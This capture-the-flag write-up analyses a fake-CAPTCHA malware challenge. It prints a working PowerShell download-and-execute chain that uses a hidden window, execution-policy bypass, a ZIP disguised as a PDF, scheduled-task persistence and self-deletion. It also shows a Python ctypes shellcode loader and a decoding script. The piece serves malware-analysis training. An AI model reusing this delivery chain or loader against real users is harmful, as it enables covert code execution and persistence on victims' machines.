## Challenge Name

Verify You Are Human (malware Category)

## Challenge Description
My computer said I needed to update MS Teams, so that is what I have been trying to do...
...but I can't seem to get past this CAPTCHA!

On opening the instance of this challenge we get a page with a standard CAPTCHA, after clicking the **verify button** it says to open **win+R** , what i noticed was that on clicking the button it copied a script to my clipboard:

```
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';
irm 'http://ef55808b.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```
This is just a sequence of three commands:

1.$UkvqRHtIr = $env:LocalAppData + '\' + (Get-Random ...) + '.PS1'
    What it does: It creates a variable with a random name ($UkvqRHtIr). It sets this variable to a file path. The path will be in your AppData\Local folder (a common hiding spot for malware) with a random number for a filename, ending in .PS1. For example: C:\Users\YourUser\AppData\Local\12345.PS1.

2.irm 'http://...'> $UkvqRHtIr
    What it does: This is the download part. irm is a PowerShell alias for Invoke-RestMethod. It downloads the content from the URL http://3112d1c4.proxy.coursestack.com:443/?tic=1 and saves it to the file path created in step 1. This is the file you need to analyze.

3.powershell -Wi HI -ep bypass -f $UkvqRHtIr
    What it does: This is the execution part. It starts a new, hidden PowerShell window (-Wi HI), bypasses security policies (-ep bypass), and runs the .PS1 script it just downloaded.

On using **curl "https://3112d1c4.proxy.coursestack.com/?tic=1" --cookie "token=MY_oncoursestack_token_for_the_challenge" --output payload.ps1**

This time the file had another powershell script :

```
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://3112d1c4.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboardz
```
## Deconstructing the PowerShell Script

This script is much more complex than the first one. It's not just a downloader; it's an installer and executer.

1.$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);
    Action: Deobfuscates a file extension.
    Analysis: . (46) + p (112) + y (121) + c (99) = .pyc. This is a compiled Python file extension. This is a huge clue. The malware's final payload is Python.

2.$HMGDSHGSHSHS = [guid]::NewGuid(); $OIEOPTRJGS = $env:LocalAppData;
    Action: Sets up variables.
    Analysis: Creates a new Globally Unique Identifier (GUID), which will look like a1b2c3d4-e5f6-.... This will be used as a random filename. It also sets a variable to the AppData\Local folder path.

3.irm 'http://3112d1c4.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;
    Action: Downloads the next payload.
    Analysis: This is the next piece of the puzzle. It downloads a file from the server (notice tic=2 now) and saves it in AppData\Local with the random GUID and a fake .pdf extension. This file is not a PDF; it's a ZIP file.

4.Add-Type...; [System.IO.Compression.ZipFile]::ExtractToDirectory(...);
    Action: Unzips the downloaded file.
    Analysis: It extracts the contents of the fake .pdf (which is a ZIP file) into a new folder, also named with the random GUID.

5.$PIEVSDDGs = Join-Path ...; $RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe"; $RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";
    Action: Defines paths to the extracted files.
    Analysis: After unzipping, there will be a folder containing at least pythonw.exe (a windowless Python interpreter) and cpython-3134.pyc (the compiled Python script payload).

6.New-ScheduledTaskAction ... Register-ScheduledTask ...;
    Action: Creates a scheduled task.
    Analysis: This is a persistence mechanism. It sets up a scheduled task to run the Python script 3 minutes (.AddSeconds(180)) from now. This ensures the malware runs again even if the user reboots.

7.Set-Location $PIEVSDDGs; $WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item ...;
    Action: Renames the Python file.
    Analysis: It changes the filename from cpython-3134 to cpython-3134.pyc 

8.iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + ...);
    Action: Executes the Python payload immediately.
    Analysis: This command runs the pythonw.exe interpreter and tells it to execute the renamed .pyc file. This is the main execution of the payload.

9.Remove-Item $MyInvocation.MyCommand.Path -Force; Set-Clipboard
    Action: Cleans up.
    Analysis: It deletes the PowerShell script itself to cover its tracks.

So this is the second stage of that script. It downloads a fake “PDF” from the same server, which is actually a ZIP file containing a portable Python environment and a payload.

We isolate the URL and download the zip file using our challenge token:
**curl "https://3112d1c4.proxy.coursestack.com/?tic=2" --cookie "token=my_challenge_token" --output payload.zip**

we unzip the payload and can see many files: 
```
_asyncio.pyd      _decimal.pyd      libffi-8.dll  _multiprocessing.pyd  
python313.dll   python.cat   select.pyd    _ssl.pyd          winsound.pyd
_bz2.pyd          _elementtree.pyd  libssl-3.dll python313._pth  python.exe
_socket.pyd   unicodedata.pyd   _wmi.pyd output.py
cpython-3134.pyc  _hashlib.pyd      LICENSE.txt   _overlapped.pyd       
python313.zip   pythonw.exe  sqlite3.dll   _uuid.pyd         _zoneinfo.pyd
_ctypes.pyd       libcrypto-3.dll   _lzma.pyd     pyexpat.pyd           p
ython3.dll     _queue.pyd   _sqlite3.pyd  vcruntime140.dll
```
since we know it executes .pyc we can see its decompiled version using **strings** on it or another tool. from it we get:

```
$ strings cpython-3134.pyc
aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigpz
utf-8)
base64
exec
        b64decode
decode
        output.py
<module>r
              
```

We can see b64 decode so we decode again for its contents:

```
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```

Now decoding it became a problem as it wasnt a direct readable text, so I converted the decoded shellcode into a hexadecimal string and print it:

``
5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3
``
# Analyzing the Shellcode
The hex string 5589e5... is a tiny program. Let's look at what it does:
55 89 e5 ...: This is standard setup code for a function.
68 93 d8 84 84: The 68 opcode is PUSH. This instruction pushes the 4 bytes 93 d8 84 84 onto the stack.

The shellcode continues to PUSH a series of 4-byte chunks. This is the encrypted flag being loaded into memory.

Later in the code, there is this instruction: 81 37 a5 a5 a5 a5. This CMP (compare) instruction is checking memory against the byte 0xa5. In CTF shellcode, this is a massive hint. The byte 0xa5 is the final XOR key.
The result might be the flag.

The shellcode's entire job is to:

1.Load a block of encrypted bytes into memory.

2.XOR every byte of that block with the key 0xa5.

I used the following script to decode the shell code

```python
import base64
import re
def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

# --- STAGE 1: Decrypt the Shellcode (using data from output.py) ---

# The Base64 string from output.py or .pyc file
encrypted_shellcode_b64 = 'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
key1_b64 = 'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='

# Decode the data
ciphertext1 = base64.b64decode(encrypted_shellcode_b64)
key1 = base64.b64decode(key1_b64)

# Decrypt to get the raw shellcode bytes
decrypted_shellcode = xor_decrypt(ciphertext1, key1)


# STAGE 2: Emulate the Shellcode to Decrypt 

# 1. Find all 4-byte chunks pushed by the shellcode
chunks = []
i = 0
while i < len(decrypted_shellcode):
    if decrypted_shellcode[i] == 0x68: # PUSH opcode
        chunk = decrypted_shellcode[i+1:i+5]
        chunks.append(chunk)
        i += 5
    else:
        i += 1

# 2. The stack is LIFO (Last-In, First-Out). We must reverse the ORDER of the chunks.
chunks.reverse()

# 3. Re-assemble the encrypted flag from the correctly ordered chunks
stage2_encrypted_flag = bytearray()
for chunk in chunks:
    stage2_encrypted_flag.extend(chunk)

# 4. The shellcode uses a single-byte XOR key: 0xa5
key2 = 0xa5

# 5. Decrypt the re-assembled data to get the final flag
final_flag_bytes = bytearray()
for byte in stage2_encrypted_flag:
    final_flag_bytes.append(byte ^ key2)

print("Decoded code:")
# We strip any trailing null bytes (.strip('\x00')) that might be left from the shellcode padding
print(final_flag_bytes.decode('utf-8').strip('\x00'))

```
This gives us the flag: **``Decoded code: flag{d341b8d2c96e9cc96965afbf5675fc26}!!``**
